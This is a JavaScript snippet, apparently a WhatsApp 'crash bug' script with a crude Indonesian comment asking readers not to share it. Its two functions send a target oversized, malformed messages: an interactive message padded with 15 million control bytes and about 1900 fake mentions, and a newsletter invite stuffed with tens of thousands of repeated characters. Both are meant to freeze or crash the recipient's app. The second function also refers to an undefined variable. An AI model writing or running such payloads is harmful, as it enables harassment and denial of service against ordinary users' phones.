/*Jangan Share Ke Pt Lu Kontol
Pokoknya Jangan Share Ya Anj
\*/
async function InvisCall(Xyudh, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "༏ 𝐗𝐳𝐞𝐫𝐨༝𝐘𝐮𝐝𝐗 ༏",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(15000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await Xyudh.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function blanknih(target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "༏ 𝐗𝐳𝐞𝐫𝐨༝𝐘𝐮𝐝𝐗 ༏" + "ꦽꦾ".repeat(15000),
      caption: "༼༏ 𝐗𝐩𝐚𝐧𝐚𝐭𝐢𝐨𝐍 ༏༽" + "ꦽꦾ".repeat(15000),
      inviteExpiration: "9282682616283736",
    }
  };

  await Xyudh.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
}